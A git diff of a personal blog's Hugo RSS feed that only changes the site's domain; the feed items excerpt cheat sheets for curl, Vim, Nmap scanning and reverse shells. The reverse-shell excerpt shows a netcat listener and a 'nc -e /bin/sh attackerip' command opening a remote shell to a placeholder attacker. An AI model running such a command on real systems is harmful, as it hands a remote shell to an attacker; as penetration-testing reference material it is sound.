@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tools on WhereIsMyMind</title><link>https://hare001.github.io/tags/tools/</link><description>Recent content in Tools on WhereIsMyMind</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Fri, 17 Jul 2020 16:30:13 +0800</lastBuildDate><atom:link href="https://hare001.github.io/tags/tools/index.xml" rel="self" type="application/rss+xml"/><item><title>Curl Cheat Sheet</title><link>https://hare001.github.io/posts/curl-cheat-sheet/</link><pubDate>Fri, 17 Jul 2020 16:30:13 +0800</pubDate><guid>https://hare001.github.io/posts/curl-cheat-sheet/</guid><description>&lt;h3 id="options">Options&lt;/h3>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tools on WhereIsMyMind</title><link>https://hare.one/tags/tools/</link><description>Recent content in Tools on WhereIsMyMind</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Fri, 17 Jul 2020 16:30:13 +0800</lastBuildDate><atom:link href="https://hare.one/tags/tools/index.xml" rel="self" type="application/rss+xml"/><item><title>Curl Cheat Sheet</title><link>https://hare.one/posts/curl-cheat-sheet/</link><pubDate>Fri, 17 Jul 2020 16:30:13 +0800</pubDate><guid>https://hare.one/posts/curl-cheat-sheet/</guid><description>&lt;h3 id="options">Options&lt;/h3>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -o &amp;lt;file&amp;gt; &lt;span style="color:#75715e"># --output: write to file&lt;/span>
 curl -u user:pass &lt;span style="color:#75715e"># --user: Authentication&lt;/span>
 curl -v &lt;span style="color:#75715e"># --verbose&lt;/span>
@@ -6,13 +6,13 @@ curl -vv &lt;span style="color:#75715e"># Even more verbose&lt;/span>
 curl -s &lt;span style="color:#75715e"># --silent&lt;/span>
 curl -i &lt;span style="color:#75715e"># --include: Include the HTTP-header in the output&lt;/span>
 curl -I &lt;span style="color:#75715e"># --head: headers only&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Vim Cheat Sheet</title><link>https://hare001.github.io/posts/vim-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:32:10 +0800</pubDate><guid>https://hare001.github.io/posts/vim-cheat-sheet/</guid><description>&lt;h3 id="全局">全局&lt;/h3>
+&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Vim Cheat Sheet</title><link>https://hare.one/posts/vim-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:32:10 +0800</pubDate><guid>https://hare.one/posts/vim-cheat-sheet/</guid><description>&lt;h3 id="全局">全局&lt;/h3>
 &lt;pre>&lt;code class="language-wiki" data-lang="wiki">:h[elp] 关键字 - 打开关键字帮助
 :sav[eas] 文件名 - 另存为
 :clo[se] - 关闭当前窗口
 :ter[minal] - open a terminal window
 K - 打开光标所在单词的man页面
-&lt;/code>&lt;/pre></description></item><item><title>Nmap Cheat Sheet</title><link>https://hare001.github.io/posts/namp-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:27:34 +0800</pubDate><guid>https://hare001.github.io/posts/namp-cheat-sheet/</guid><description>&lt;h3 id="nmap-target-selection">Nmap Target Selection&lt;/h3>
+&lt;/code>&lt;/pre></description></item><item><title>Nmap Cheat Sheet</title><link>https://hare.one/posts/namp-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:27:34 +0800</pubDate><guid>https://hare.one/posts/namp-cheat-sheet/</guid><description>&lt;h3 id="nmap-target-selection">Nmap Target Selection&lt;/h3>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan a single IP&lt;/span>
 nmap 192.168.1.1
 &lt;span style="color:#75715e">#Scan a host&lt;/span>
@@ -23,7 +23,7 @@ nmap 192.168.1.1-20
 nmap 192.168.1.0/24
 &lt;span style="color:#75715e">#Scan targets from a text file&lt;/span>
 nmap -iL list-of-ips.txt
-&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Reverse Shell Cheat Sheet</title><link>https://hare001.github.io/posts/reverse-shell-cheat-sheet/</link><pubDate>Tue, 30 Jun 2020 17:22:05 +0800</pubDate><guid>https://hare001.github.io/posts/reverse-shell-cheat-sheet/</guid><description>&lt;h2 id="利用-nc-监听端口">利用 nc 监听端口&lt;/h2>
+&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Reverse Shell Cheat Sheet</title><link>https://hare.one/posts/reverse-shell-cheat-sheet/</link><pubDate>Tue, 30 Jun 2020 17:22:05 +0800</pubDate><guid>https://hare.one/posts/reverse-shell-cheat-sheet/</guid><description>&lt;h2 id="利用-nc-监听端口">利用 nc 监听端口&lt;/h2>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -lvp &lt;span style="color:#ae81ff">2333&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nc-版本">nc 版本：&lt;/h2>
 &lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -e /bin/sh attackerip &lt;span style="color:#ae81ff">2333&lt;/span>
